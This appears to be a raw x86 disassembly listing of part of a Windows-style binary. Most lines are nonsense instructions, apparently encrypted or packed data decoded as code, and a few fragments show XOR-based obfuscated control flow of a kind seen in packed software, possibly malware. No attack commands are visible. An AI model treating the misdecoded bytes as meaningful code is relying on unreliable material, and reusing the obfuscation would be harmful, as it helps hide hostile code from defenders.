  41511b:	pop    esi
  41511c:	sar    DWORD PTR [edx-0x2e57c3a1],cl
  415122:	test   BYTE PTR [ebx-0x78eef7e6],0xb
  415129:	ins    DWORD PTR es:[edi],dx
  41512a:	and    BYTE PTR [ebp-0x68],0x90
  41512e:	xchg   BYTE PTR [ebx+edx*2+0x1],ch
  415132:	xor    BYTE PTR [ebx-0x30],0x6a
  415136:	push   0x5fad48ce
  41513b:	(bad)  
  41513c:	pop    edx
  41513d:	adc    BYTE PTR [ebp-0x7b050576],dh
  415143:	repnz adc BYTE PTR [edx-0x5d1ce75c],dh
  41514a:	mov    BYTE PTR [edi+0x16],ah
  41514d:	push   0x486935ee
  415152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415153:	xlat   BYTE PTR ds:[ebx]
  415154:	xchg   BYTE PTR [ebx-0x6f],bl
  415157:	inc    ecx
  415158:	pop    edi
  415159:	sar    BYTE PTR [esi-0x3],cl
  41515c:	imul   ebx,DWORD PTR [eax+ebx*8],0xc1351a58
  415163:	in     al,dx
  415164:	shr    DWORD PTR [ecx],1
  415166:	push   esp
  415167:	repz mov esp,0xcf95de57
  41516d:	mov    ecx,ecx
  41516f:	cld    
  415170:	mov    bl,0xe
  415172:	(bad)  
  415173:	adc    eax,0x186e3011
  415178:	int3   
  415179:	add    al,0xc5
  41517b:	aas    
  41517c:	(bad)  
  41517d:	fwait
  41517e:	popf   
  41517f:	sub    esp,eax
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fst    DWORD PTR [eax+0x40]
  4151a6:	pop    es
  4151a7:	jb     0x415196
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	lahf   
  4151b1:	mov    BYTE PTR [eax-0x4a],bl
  4151b4:	nop
  4151b5:	sub    ch,BYTE PTR [ebp-0x199a37da]
  4151bb:	jns    0x415159
  4151bd:	cli    
  4151be:	icebp  
  4151bf:	pop    eax
  4151c0:	mov    ebp,0xa1ffbe86
  4151c5:	push   ecx
  4151c6:	or     eax,0x5232d682
  4151cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151cc:	ins    BYTE PTR es:[edi],dx
  4151cd:	mov    eax,0xefc8a4bc
  4151d2:	sub    eax,DWORD PTR [esi+0x21a8b6ee]
  4151d8:	das    
  4151d9:	cmp    ch,dh
  4151db:	dec    edi
  4151dc:	xor    DWORD PTR [esi-0x3ccd902],esp
  4151e2:	sub    BYTE PTR [ebp-0x55],cl
  4151e5:	(bad)  [ebx]
  4151e7:	popf   
  4151e8:	hlt    
  4151e9:	sub    ah,BYTE PTR ds:0x8056ffd7
  4151ef:	(bad)  
  4151f1:	into   
  4151f2:	mov    cl,BYTE PTR [eax-0x75]
  4151f5:	push   edx
  4151f6:	dec    ecx
  4151f7:	retf   0xc854
  4151fa:	add    eax,DWORD PTR [ebp-0x28]
  4151fd:	sbb    BYTE PTR [ecx-0xb],cl
  415200:	xchg   esp,eax
  415201:	rcr    bh,cl
  415203:	aas    
  415204:	in     al,dx
  415205:	sbb    esi,DWORD PTR [edx+0x1a]
  415208:	(bad)
  41520b:	pop    es
  41520c:	repz into 
  41520e:	out    dx,eax
  41520f:	xchg   edx,eax
  415210:	inc    edi
  415211:	cdq    
  415212:	add    ch,ch
  415214:	ret    0x74ba
  415217:	push   esp
  415218:	loope  0x4151ec
  41521a:	xchg   edi,eax
  41521b:	in     eax,0xa1
  41521d:	and    eax,0xd063cb10
  415222:	inc    esi
  415223:	scas   al,BYTE PTR es:[edi]
  415224:	retf   
  415225:	pop    ebx
  415226:	sub    BYTE PTR [edx],al
  415228:	(bad)  
  415229:	jmp    0x415284
  41522b:	mov    bl,0xb2
  41522d:	push   ecx
  41522e:	pop    ebp
  41522f:	rcr    bl,0x16
  415232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415233:	pop    edi
  415234:	add    eax,0x37c764d5
  415239:	fdivr  DWORD PTR [eax+eax*2+0x515a4fcc]
  415240:	shr    BYTE PTR [ecx],0x18
  415243:	clc    
  415244:	mov    ah,0xfb
  415246:	fs ret 
  415248:	mov    BYTE PTR [ecx],ah
  41524a:	pusha  
  41524b:	jl     0x4152c9
  41524d:	(bad)  
  41524e:	or     esp,edx
  415250:	mov    dh,0xbc
  415252:	add    cl,BYTE PTR [ecx+0x610135f3]
  415258:	enter  0x2e03,0x9e
  41525c:	mov    ah,0x14
  41525e:	js     0x41527c
  415260:	push   es
  415261:	mov    WORD PTR [esi],?
  415263:	pop    edi
  415264:	adc    edx,DWORD PTR [edi]
  415266:	push   ds
  415267:	push   edi
  415268:	pop    ebx
  415269:	(bad)  
  41526a:	xchg   DWORD PTR [ebp+0x18],ebx
  41526d:	fistp  QWORD PTR [esi+0x7b838002]
  415273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415274:	sub    BYTE PTR [ecx-0x3e1dae61],al
  41527a:	sahf   
  41527b:	fadd   st(7),st
  41527d:	inc    ecx
  41527e:	inc    eax
  41527f:	ret    0xeb7
  415282:	hlt    
  415283:	add    BYTE PTR [ecx+0x43],ch
  415286:	aas    
  415287:	gs retf 0x7578
  41528b:	pop    ebp
  41528c:	je     0x41521d
  41528e:	test   eax,0x1a1d33e7
  415293:	mov    BYTE PTR [ebx],dh
  415295:	fisub  WORD PTR [edi-0x784595c3]
  41529b:	fist   DWORD PTR [edx-0x2ed807e9]
  4152a1:	adc    al,0x8f
  4152a3:	mov    WORD PTR [edx],?
  4152a5:	lea    esi,[edi-0x4e]
  4152a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152a9:	aam    0x6d
  4152ab:	ds xchg esi,eax
  4152ad:	sbb    bh,al
  4152af:	rcr    DWORD PTR [esi+0x1ed199a9],0x3
  4152b6:	mov    eax,0x46a47cc8
  4152bb:	mov    dl,0x0
  4152bd:	mov    bl,0x69
  4152bf:	data16 and bh,BYTE PTR [ecx+0x25]
  4152c3:	outs   dx,DWORD PTR ds:[esi]
  4152c4:	dec    ecx
  4152c5:	scas   eax,DWORD PTR es:[edi]
  4152c6:	test   ebp,esp
  4152c8:	jb     0x415292
  4152ca:	and    BYTE PTR [edi-0x67],dh
  4152cd:	test   DWORD PTR [ebp-0x4a],ebp
  4152d0:	or     DWORD PTR [esi],ebx
  4152d2:	pop    ds
  4152d3:	inc    edi
  4152d4:	jg     0x4152fd
  4152d6:	out    0x9c,al
  4152d8:	sub    cl,dh
  4152da:	shr    bl,0xe
  4152dd:	popf   
  4152de:	mov    fs,WORD PTR [ebp+0x46dc8cae]
  4152e4:	mov    dh,0xcb
  4152e6:	push   0x16a7d98f
  4152eb:	mov    ds:0xa1ed23cd,al
  4152f0:	jmp    0x4a82:0x3c4b50a
  4152f7:	cdq    
  4152f8:	paddusb mm2,mm6
  4152fb:	fild   QWORD PTR [ebx-0x12]
  4152fe:	jmp    0x1b29:0x724e2ff2
  415305:	fsubr  DWORD PTR [esi]
  415307:	lock scas eax,DWORD PTR es:[edi]
  415309:	shl    DWORD PTR [ecx-0x2830cfc6],0x69
  415310:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415311:	cmp    ebp,ebx
  415313:	lods   eax,DWORD PTR ds:[esi]
  415314:	mov    edx,0x9ed27310
  415319:	retf   0x6506
  41531c:	imul   edi
  41531e:	sbb    BYTE PTR [edi-0x7a],bl
  415321:	xchg   DWORD PTR [edi+0x4f4dbff9],eax
  415327:	or     esi,esp
  415329:	and    ebp,DWORD PTR [esp+ebx*8]
  41532c:	ins    BYTE PTR es:[edi],dx
  41532d:	pushf  
  41532e:	fnstenv [esi+0x6]
  415331:	xchg   edx,eax
  415332:	xor    BYTE PTR [ebx+0x76cb1871],bl
  415338:	and    al,0x35
  41533a:	lods   eax,DWORD PTR ds:[esi]
  41533b:	int    0xc2
  41533d:	mov    dh,0x1a
  41533f:	rcr    BYTE PTR ds:0xbacbbf2c,cl
  415345:	clc    
  415346:	xchg   DWORD PTR [ecx-0x4db7df83],edx
  41534c:	sub    al,0x8a
  41534e:	jge    0x4153c5
  415350:	adc    DWORD PTR [edx+0x4c],ebp
  415353:	sub    DWORD PTR [esi+0x43],ebp
  415356:	es daa 
  415358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415359:	inc    edx
  41535a:	lahf   
  41535b:	shl    BYTE PTR [ebx],0x63
  41535e:	stc    
  41535f:	ss cmp eax,0x52ee95b6
  415365:	inc    eax
  415366:	sbb    edi,edx
  415368:	jmp    0x3885:0xf4f81db0
  41536f:	icebp  
  415370:	ficom  WORD PTR [ecx+0xb5f5b36]
  415376:	scas   eax,DWORD PTR es:[edi]
  415377:	xchg   DWORD PTR [eax+0x63ef52ae],esp
  41537d:	jo     0x415319
  41537f:	sbb    eax,0x77b4c93
  415384:	mov    ebx,0x272f954a
  415389:	scas   eax,DWORD PTR es:[edi]
  41538a:	fdivr  st(0),st
  41538c:	adc    al,0x8d
  41538e:	aam    0xbf
  415390:	pop    esi
  415391:	jne    0x4153b3
  415393:	xchg   ebx,eax
  415394:	loope  0x4153aa
  415396:	mov    dh,0x3f
  415398:	sub    DWORD PTR [ebx-0xb],eax
  41539b:	inc    eax
  41539c:	arpl   ax,ax
  41539e:	mov    esp,0xf92dc01d
  4153a3:	mov    ecx,ss
  4153a5:	retf   
  4153a6:	and    DWORD PTR [edx+eax*4-0x65bb059e],ecx
  4153ad:	xchg   edi,eax
  4153ae:	addr16 sub al,0x6f
  4153b1:	cwde   
  4153b2:	lods   eax,DWORD PTR ds:[esi]
  4153b3:	add    DWORD PTR [edx],ecx
  4153b5:	fild   WORD PTR [ecx-0x79]
  4153b8:	mov    WORD PTR [ecx],ds
  4153ba:	icebp  
  4153bb:	cmp    al,0xaa
  4153bd:	mov    al,es:0x928a379
  4153c3:	pop    ebp
  4153c4:	jp     0x4153fd
  4153c6:	or     edi,edx
  4153c8:	sbb    eax,DWORD PTR [eax]
  4153ca:	aad    0x7e
  4153cc:	stos   BYTE PTR es:[edi],al
  4153cd:	jae    0x4153ab
  4153cf:	stos   BYTE PTR es:[edi],al
  4153d0:	inc    ebx
  4153d1:	cdq    
  4153d2:	pop    ebx
  4153d3:	in     al,0xc0
  4153d5:	ficomp DWORD PTR ds:0x47cfc15d
  4153db:	jae    0x415376
  4153dd:	mov    edi,0x204123be
  4153e2:	out    dx,al
  4153e3:	mov    BYTE PTR [edi+ecx*1],bh
  4153e6:	sub    ebx,DWORD PTR [ecx+0x33]
  4153e9:	jge    0x4153dc
  4153eb:	shl    DWORD PTR ds:0x3171dbaa,1
  4153f1:	out    0xf7,eax
  4153f3:	adc    ch,ch
  4153f5:	or     esi,eax
  4153f7:	cmp    eax,0x260e2017
  4153fc:	cmp    edx,DWORD PTR [edi+0x16fa68d6]
  415402:	arpl   WORD PTR [ebx+0x70d63510],sp
  415408:	retf   
  415409:	mov    edx,0xe09d131a
  41540e:	xor    DWORD PTR [ebp-0x6ee92539],edx
  415414:	mov    ecx,0x42e6e165
  415419:	sbb    edx,DWORD PTR [ecx]
  41541b:	and    al,0x16
  41541d:	lea    eax,[ecx+0x6d]
  415420:	mov    bl,0x9d
  415422:	test   DWORD PTR [edi-0x1a00bd52],esp
  415428:	cwde   
  415429:	xchg   BYTE PTR ds:0x7db3eb59,ch
  41542f:	imul   edi,edx,0xc6f71fc1
  415435:	adc    eax,0x534cf095
  41543a:	mov    DWORD PTR [ecx+0x7b6e17b0],edi
  415440:	retf   
  415441:	and    al,ah
  415443:	rcl    DWORD PTR ds:[ecx-0x4210a66d],cl
  41544a:	mov    cl,0x6e
  41544c:	jae    0x4154b9
  41544e:	and    al,0xcc
  415450:	push   esp
  415451:	int    0xfd
  415453:	xor    dl,BYTE PTR ds:0x60aa7ec1
  415459:	inc    eax
  41545a:	pop    edx
  41545b:	mov    BYTE PTR [ebx+ebp*1-0x2],dl
  41545f:	enter  0x288,0xb9
  415463:	cmp    BYTE PTR [esi+0x4d3c3b78],bl
  415469:	xchg   edx,eax
  41546a:	and    BYTE PTR [ebp-0x58],ah
  41546d:	in     eax,dx
  41546e:	(bad)  
  41546f:	lods   al,BYTE PTR ds:[esi]
  415470:	sbb    dh,BYTE PTR [edi]
  415472:	out    0xaf,eax
  415474:	call   0xc2455463
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0xe8
  4154c8:	ins    BYTE PTR es:[edi],dx
  4154c9:	sub    al,0xf7
  4154cb:	add    bh,BYTE PTR ss:[edi+0x70]
  4154cf:	mov    ecx,0x2170707e
  4154d4:	jbe    0x4154ef
  4154d6:	xor    ah,cl
  4154d8:	cmp    DWORD PTR [ebx-0x1e],esp
  4154db:	xchg   esp,eax
  4154dc:	xlat   BYTE PTR ds:[ebx]
  4154dd:	mov    al,ds:0xfdb7f52e
  4154e2:	ret    
  4154e3:	mov    ds:0xc3719960,al
  4154e8:	inc    ebx
  4154e9:	rcl    DWORD PTR [ebx],0x34
  4154ec:	add    DWORD PTR [ebx-0x52],eax
  4154ef:	mov    ds:0xe92fa189,eax
  4154f4:	(bad)  
  4154f5:	scas   eax,DWORD PTR es:[edi]
  4154f6:	mov    ds:0x3f4dc981,eax
  4154fb:	pusha  
  4154fc:	cli    
  4154fd:	or     bh,BYTE PTR [esi-0x30c68290]
  415503:	jecxz  0x41554f
  415505:	sbb    ah,BYTE PTR [ecx-0x4a]
  415508:	mov    eax,ds:0x2e163af7
  41550d:	sahf   
  41550e:	xlat   BYTE PTR ds:[ebx]
  41550f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415510:	sbb    esi,DWORD PTR [eax+0x52]
  415513:	adc    BYTE PTR es:0xc8123671,bh
  41551a:	xor    eax,eax
  41551c:	xchg   esp,eax
  41551d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41551e:	pop    ss
  41551f:	fisub  DWORD PTR [ecx+0x39]
  415522:	fisttp QWORD PTR [esi-0x6e]
  415525:	gs and eax,0x63d035f0
  41552b:	push   edx
  41552c:	fdivr  QWORD PTR [eax]
  41552e:	into   
  41552f:	mov    ebx,0xa4bf5fa6
  415534:	xor    bl,BYTE PTR [ebp-0x43]
  415537:	push   ebp
  415538:	enter  0x76d0,0x7
  41553c:	inc    esi
  41553d:	(bad)  
  41553e:	pop    esi
  41553f:	cwde   
  415540:	sbb    DWORD PTR [edx],esi
  415542:	xor    ecx,DWORD PTR [edx+ebx*8]
  415545:	ror    BYTE PTR [ebx],cl
  415547:	mov    esi,0x6aea6734
  41554c:	xchg   DWORD PTR [eax+0x3787b7b8],eax
  415552:	retf   0x924e
  415555:	xor    eax,0xbc08ebde
  41555a:	icebp  
  41555b:	xchg   ebp,eax
  41555c:	fwait
  41555d:	mov    eax,0xfaf0f26c
  415562:	pop    esp
  415563:	repz data16 mov WORD PTR [edx],cs
  415567:	jp     0x4155b1
  415569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41556a:	sub    dh,BYTE PTR [edi+esi*8]
  41556d:	dec    eax
  41556e:	sub    DWORD PTR [esi],esi
  415570:	aad    0xb0
  415572:	fstp   QWORD PTR [esi]
  415574:	pushf  
  415575:	or     esi,ecx
  415577:	cld    
  415578:	es lock jbe 0x4155d7
  41557c:	(bad)  
  41557d:	pop    ebp
  41557e:	jno    0x415581
  415580:	mov    ch,0xf
  415582:	scas   eax,DWORD PTR es:[edi]
  415583:	cmp    al,0xc3
  415585:	test   al,0x80
  415587:	cmp    ebp,edx
  415589:	push   ebp
  41558a:	(bad)  
  41558b:	ffree  st(6)
  41558d:	jg     0x4155e9
  41558f:	imul   eax,DWORD PTR [edx+0x29],0xffffffd2
  415593:	ds (bad) 
  415596:	addr16 sub eax,ebp
  415599:	inc    edi
  41559a:	add    cl,BYTE PTR [edi+0x64]
  41559d:	fadd   QWORD PTR [edi+0x19a5d77c]
  4155a3:	or     ebp,0x4b
  4155a6:	ja     0x41558f
  4155a8:	jg     0x4155b6
  4155aa:	out    0xf6,eax
  4155ac:	cs pop ds
  4155ae:	jns    0x41559a
  4155b0:	inc    esi
  4155b1:	push   ds
  4155b2:	not    DWORD PTR [edx]
  4155b4:	ins    DWORD PTR es:[edi],dx
  4155b5:	sub    al,0x30
  4155b7:	imul   edx,DWORD PTR [ebx],0x70
  4155ba:	push   ebp
  4155bb:	shr    BYTE PTR [edi-0x215d98e2],cl
  4155c1:	and    bh,BYTE PTR [ecx+edi*2-0x12]
  4155c5:	fidiv  DWORD PTR [ecx]
  4155c7:	shl    BYTE PTR [esi+0x3e719a66],0xd0
  4155ce:	mov    WORD PTR [edx+0x0],ss
  4155d1:	fadd   QWORD PTR [ebp+0x6e]
  4155d4:	dec    ecx
  4155d5:	out    0xf6,al
  4155d7:	cmp    eax,0xa4bf527c
  4155dc:	pop    edx
  4155dd:	sar    DWORD PTR [eax+0x2bd72521],cl
  4155e3:	push   ebp
  4155e4:	ja     0x4155ab
  4155e6:	xor    ebx,DWORD PTR [edi-0x72]
  4155e9:	inc    esp
  4155ea:	jmp    0x756:0xa820a4c9
  4155f1:	cmp    BYTE PTR [edi+ecx*2+0x4aad4b18],ah
  4155f8:	mov    ebp,0xa365b6da
  4155fd:	cli    
  4155fe:	fsub   QWORD PTR [ecx+0x6d234d9f]
  415604:	jmp    0x8cb0:0xd64b7c63
  41560b:	pop    ss
  41560c:	bound  esi,QWORD PTR [esi+0x5be75413]
  415612:	cmp    ch,BYTE PTR ds:0x3933e809
  415618:	and    BYTE PTR [edx-0x1],0x51
  41561c:	inc    ecx
  41561d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41561f:	jbe    0x4155b9
  415621:	xchg   ecx,eax
  415622:	aad    0xbc
  415624:	stos   DWORD PTR es:[edi],eax
  415625:	jmp    0x41564a
  415627:	out    dx,eax
  415628:	inc    edx
  415629:	or     eax,0x3a9258f6
  41562e:	push   0xffffffa7
  415630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415631:	jne    0x41565e
  415633:	retf   
  415634:	cs loop 0x415642
  415637:	sub    eax,0xe8a854d8
  41563c:	inc    eax
  41563d:	jbe    0x4156bb
  41563f:	andnps xmm2,XMMWORD PTR [esp+eiz*4-0x36]
  415644:	mov    ds:0xfce674f8,eax
  415649:	push   ebx
  41564a:	inc    ebp
  41564b:	sbb    BYTE PTR [edi-0x19b85d32],cl
  415651:	mov    esi,0x46886b1a
  415656:	and    eax,0xf1d87bf
  41565b:	test   DWORD PTR [esi-0x56d4c700],esi
  415661:	xor    BYTE PTR [eax+0x55],bh
  415664:	mov    ds:0xcb7cb00,al
  415669:	or     BYTE PTR [ecx+0x3027f50f],bh
  41566f:	shl    DWORD PTR [ebx],1
  415671:	xor    ebp,esp
  415673:	les    esi,FWORD PTR [ebx]
  415675:	cmp    al,0x1
  415677:	jge    0x4155fd
  415679:	cmc    
  41567a:	xor    eax,0x718a753b
  41567f:	sbb    ch,ch
  415681:	leave  
  415682:	sbb    edx,DWORD PTR [esi+0x2c8eca68]
  415688:	into   
  415689:	mov    al,ds:0xa156cef2
  41568e:	(bad)  
  41568f:	adc    DWORD PTR [eax-0x2b171da9],ebp
  415695:	jno    0x4156ed
  415697:	add    BYTE PTR [edx],ah
  415699:	adc    edx,DWORD PTR [esi+ebx*1+0x2df58e72]
  4156a0:	test   al,0xd4
  4156a2:	fsubr  QWORD PTR [ecx]
  4156a4:	addr16 pop edx
  4156a6:	mov    ?,WORD PTR [ebx]
  4156a8:	mov    ecx,DWORD PTR [ecx-0x4f]
  4156ab:	outs   dx,DWORD PTR ds:[esi]
  4156ac:	inc    esi
  4156ad:	(bad)  
  4156af:	sub    eax,0x34ef42f0
  4156b4:	fiadd  WORD PTR [edi+0x18]
  4156b7:	xchg   ebx,eax
  4156b8:	outs   dx,DWORD PTR ds:[esi]
  4156b9:	loop   0x41573a
  4156bb:	push   esi
  4156bc:	(bad)  
  4156bd:	lods   eax,DWORD PTR ds:[esi]
  4156be:	stos   BYTE PTR es:[edi],al
  4156bf:	push   eax
  4156c0:	inc    edi
  4156c1:	jnp    0x4156bd
  4156c3:	push   edi
  4156c4:	sub    DWORD PTR [ecx+ebx*1+0x62b41895],edi
  4156cb:	(bad)  
  4156cc:	pop    esp
  4156cd:	test   DWORD PTR [esi+0xc7fa989],ebp
  4156d3:	call   0xaeca1ecd
  4156d8:	mov    eax,ds:0xea59e4f
  4156dd:	jp     0x4156d0
  4156df:	and    al,0xf3
  4156e1:	out    dx,eax
  4156e2:	mov    ah,0xc7
  4156e4:	cmp    ecx,edx
  4156e6:	adc    bh,BYTE PTR [edx]
  4156e8:	sbb    cl,0x99
  4156eb:	dec    esp
  4156ec:	push   esi
  4156ed:	nop
  4156ee:	and    BYTE PTR ds:0xc3e0b993,bh
  4156f4:	dec    ebp
  4156f5:	shr    DWORD PTR [ecx],1
  4156f7:	cmp    WORD PTR [edi],di
  4156fa:	xchg   edx,eax
  4156fb:	push   ebx
  4156fc:	mov    eax,ds:0xc5ff387b
  415701:	cld    
  415702:	pop    ecx
  415703:	stc    
  415704:	jo     0x4156ab
  415706:	add    al,0x53
  415708:	pusha  
  415709:	es aam 0x41
  41570c:	repnz or BYTE PTR [esi+0x49],cl
  415710:	mov    ecx,0x6352f05f
  415715:	inc    edx
  415716:	sar    eax,cl
  415718:	loop   0x41573a
  41571a:	xor    eax,0x173d0607
  41571f:	retf   0x9476
  415722:	mov    al,BYTE PTR [ebx]
  415724:	lahf   
  415725:	mov    eax,0xaac0232e
  41572a:	jno    0x415772
  41572c:	imul   ebx,DWORD PTR [ebp-0x3c950a67],0xa0eb55ec
  415736:	inc    ebp
  415737:	test   DWORD PTR ds:0x74a2c6c6,eax
  41573d:	mov    ebp,0x544cb229
  415742:	out    dx,eax
  415743:	js     0x4156e3
  415745:	or     al,0x5c
  415747:	adc    BYTE PTR [ebx+edi*4],ah
  41574a:	xor    al,0x60
  41574c:	dec    esi
  41574d:	scas   al,BYTE PTR es:[edi]
  41574e:	mov    al,0x31
  415750:	cwde   
  415751:	aam    0xc1
  415753:	sbb    DWORD PTR [esi-0x5d],0xffffffd1
  415757:	ja     0x4156e7
  415759:	pop    ss
  41575a:	dec    edi
  41575b:	cmp    al,0xe3
  41575d:	push   eax
  41575e:	inc    ebx
  41575f:	xchg   esp,eax
  415760:	adc    ah,BYTE PTR [edx]
  415762:	pop    ds
  415763:	repnz cmp al,0x1b
  415766:	ror    esi,1
  415768:	lods   eax,DWORD PTR ds:[esi]
  415769:	dec    esi
  41576a:	retf   0x9116
  41576d:	cmp    al,0xce
  41576f:	push   ss
  415770:	fisub  DWORD PTR [edx-0x7]
  415773:	in     al,dx
  415774:	mov    esi,0xbfbe10fd
  415779:	out    0xe,al
  41577b:	stc    
  41577c:	sti    
  41577d:	and    dl,BYTE PTR ds:0x21d715dc
  415783:	sbb    esp,DWORD PTR [esi-0x5e]
  415786:	mov    bl,0xe7
  415788:	sbb    al,0xbd
  41578a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41578b:	pop    ebx
  41578c:	dec    eax
  41578d:	mov    edx,DWORD PTR [eax]
  41578f:	pushf  
  415790:	add    ah,BYTE PTR [esi]
  415792:	jbe    0x415737
  415794:	jle    0x415736
  415796:	xor    ebx,esi
  415798:	gs call 0x300:0x32729cbe
  4157a0:	(bad)  
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   bl,bh
  4157b8:	jg     0x4157e1
  4157ba:	in     al,0x7f
  4157bc:	movq   QWORD PTR [eax-0x47],mm6
  4157c0:	jle    0x415832
  4157c2:	jo     0x4157ce
  4157c4:	int3   
  4157c5:	lods   eax,DWORD PTR ds:[esi]
  4157c6:	add    eax,0xdb1eeb0a
  4157cb:	test   BYTE PTR [esi-0x7d],bl
  4157ce:	cli    
  4157cf:	mov    cl,0x59
  4157d1:	loope  0x415791
  4157d3:	loopne 0x4157d7
  4157d5:	out    dx,eax
  4157d6:	ins    BYTE PTR es:[edi],dx
  4157d7:	fadd   QWORD PTR [eax+eax*8+0x26d077fb]
  4157de:	(bad)  
  4157df:	outs   dx,DWORD PTR ds:[esi]
  4157e0:	stos   DWORD PTR es:[edi],eax
  4157e1:	or     eax,esi
  4157e3:	jo     0x4157d6
  4157e5:	shr    BYTE PTR ds:0x58f8814,0x54
  4157ec:	jb     0x4157eb
  4157ee:	add    DWORD PTR [esi-0x4a],esp
  4157f1:	mov    dl,0x72
  4157f3:	and    ebp,DWORD PTR [edx]
  4157f5:	ja     0x4157d0
  4157f7:	sub    eax,0x380ab72b
  4157fc:	mov    WORD PTR [edi],ss
  4157fe:	jg     0x415783
  415800:	push   0xffffffbc
  415802:	dec    eax
  415803:	jmp    0x738e:0x116ad037
  41580a:	sbb    al,BYTE PTR [ebx+ebp*4-0x22017889]
  415811:	ss (bad) 
  415813:	jmp    0x415878
  415815:	imul   esp,eax,0xfffffffa
  415818:	mov    BYTE PTR [ecx-0x36fc08c5],dl
  41581e:	and    BYTE PTR [esi],dh
  415820:	xor    bh,BYTE PTR [ecx+0x1d]
  415823:	ss (bad) 
  415825:	jae    0x41589b
  415827:	out    0x18,eax
  415829:	inc    edx
  41582a:	bound  ebp,QWORD PTR [ebp-0x30bc6ea5]
  415830:	pop    eax
  415831:	sar    BYTE PTR [ecx],0x86
  415834:	ins    BYTE PTR es:[edi],dx
  415835:	jp     0x4157fa
  415837:	sub    BYTE PTR [eax+0xf41dcb4],al
  41583d:	lds    edx,FWORD PTR [esi+0x2d]
  415840:	fnstenv [edx-0x13]
  415843:	inc    eax
  415844:	xchg   edx,eax
  415845:	hlt    
  415846:	inc    eax
  415847:	xor    edx,DWORD PTR ds:0xb7462dcf
  41584d:	repz cli 
  41584f:	jp     0x41584d
  415851:	popf   
  415852:	(bad)  
  415853:	popf   
  415854:	scas   eax,DWORD PTR es:[edi]
  415855:	dec    esi
  415856:	sbb    al,0xb9
  415858:	jmp    0xdbe960a7
  41585d:	xor    ecx,DWORD PTR [eax+eax*8-0x45]
  415861:	mov    cr2,ebx
  415864:	inc    ebp
  415865:	loop   0x41581d
  415867:	xor    BYTE PTR [esi-0x73365ad5],ah
  41586d:	xor    ch,BYTE PTR [ebx+0x5e23e0c1]
  415873:	out    dx,al
  415874:	dec    esp
  415875:	mov    dl,0x4e
  415877:	pop    ebp
  415878:	gs mov esi,0x5d05f6b1
  41587e:	js     0x41587e
  415880:	add    cl,BYTE PTR [ebp-0x3d9d69ca]
  415886:	mov    al,ds:0xbe34c1f8
  41588b:	ror    al,1
  41588d:	ret    0xc68a
  415890:	dec    ecx
  415891:	lock rol BYTE PTR [ecx+0x31],cl
  415895:	out    dx,al
  415896:	jb     0x4158e7
  415898:	aam    0x9f
  41589a:	mov    eax,ds:0x451bb8ee
  41589f:	cmp    DWORD PTR [ebx],ebp
  4158a1:	in     eax,dx
  4158a2:	in     eax,dx
  4158a3:	mov    dh,0xa0
  4158a5:	in     al,dx
  4158a6:	popf   
  4158a7:	sti    
  4158a8:	ror    BYTE PTR [ecx],cl
  4158aa:	fdiv   QWORD PTR [eax+esi*8+0x2]
  4158ae:	sahf   
  4158af:	jns    0x4158c0
  4158b1:	jmp    0x415852
  4158b3:	lods   al,BYTE PTR ds:[esi]
  4158b4:	dec    ebx
  4158b5:	fcom   DWORD PTR [esi+0x39]
  4158b8:	dec    edx
  4158b9:	inc    ecx
  4158ba:	loope  0x4158f0
  4158bc:	xor    bl,BYTE PTR cs:[ecx+0x53]
  4158c0:	in     al,0x20
  4158c2:	ds jnp 0x415850
  4158c5:	enter  0xe215,0x9b
  4158c9:	imul   dl
  4158cb:	test   eax,0x9302095f
  4158d0:	jp     0x4158b4
  4158d2:	pop    edx
  4158d3:	lea    edx,[ebp+0x54]
  4158d6:	jnp    0x4158aa
  4158d8:	mov    fs,eax
  4158da:	add    ebp,esp
  4158dc:	xchg   al,ch
  4158de:	add    esp,DWORD PTR [edx-0x64]
  4158e1:	xchg   edi,eax
  4158e2:	dec    esi
  4158e3:	lods   al,BYTE PTR ds:[esi]
